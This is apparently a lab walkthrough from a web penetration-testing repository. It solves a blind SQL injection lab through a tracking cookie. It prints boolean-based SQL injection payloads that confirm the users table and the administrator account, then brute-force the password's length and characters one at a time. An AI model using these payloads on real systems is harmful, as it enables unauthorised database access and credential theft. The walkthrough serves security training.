### This senario:
 This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user. 

**************

We have table is ***users*** and Columns are [username,password] and username is ***administrator**


Okk we need to password for login on acount.

first we find the peremater .

![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/3f039039-3a35-4753-9f3d-ce998180786f)


we found this vuln peremater here.

![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/54cdcfc8-83b8-4f2d-a07e-151cd1a26e2f)

we used simple payload to sure from vuln.


![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/acefacdb-7eee-45c6-b4bc-1ba6d7db0636)

Here 1!=0 so server given false result.

```
' AND (SELECT 'a' FROM users LIMIT 1)='a
```

![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/4aa495b8-88a6-4b72-a2a0-9ec40604cf3e)

Ok we have users table.

```
' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/86abd2e4-9f51-4a2e-85b0-23be41231faa)

Ok we have username is administrator;

```
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/09ad5246-2eee-4976-81cb-dc7430d21785)

This payload for know how many char in password by ```length > 1``` is resutl true

we can use brute force to know this.

```
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

### 1
![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/677e4a3e-9105-4224-96b4-6c4f7f27a199)

## 2
![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/b76015ee-aa02-4c31-88b7-5597578955c0)


## 3
![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/fa6df2b4-efbf-438c-9078-28d4c65f8c54)

## 4
![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/18bbf318-a7dc-48a5-a425-8c9d98936be5)

## 5 lastly
![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/8d73f1e1-6d6b-465e-a2a2-d5e458c220a9)

We have 20 char for password


![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/6f12b594-be18-4bdc-b8b2-aef6657db522)
This payload for brute force on first char, We will using intruder again.

## 1
![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/bcdd0d74-9790-4901-b5c7-e1a5abbc3112)

##2
![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/8db78f92-f754-46d1-9cda-437c15debcd0)

## 3
![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/b8b082d0-0a8a-4179-a070-8e2490a6ec8f)

## 4
![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/8a5f6c9e-d6c7-4e2c-8096-a734cd548252)

## 5
![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/c56e3e41-75e6-4b97-af05-1ffe46687336)
Wow We have the first char from **password** is ```f```

we again try on second char

![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/7e8701c2-51d7-491c-9c3c-9ac2a1eaafe0)

Wow We have the second char from **password** is ```f```


we again try on third char
![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/a7b25388-6a61-441a-83ed-61eb5f0a2c7a)


![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/6fd7d326-b941-4a33-ba96-a0f76b00c201)



Wow Wow We have the third char from **password** is ```s``` 
Now password is ffs... , complete this.

We try again and again with change number of places's char to guess the full password.





























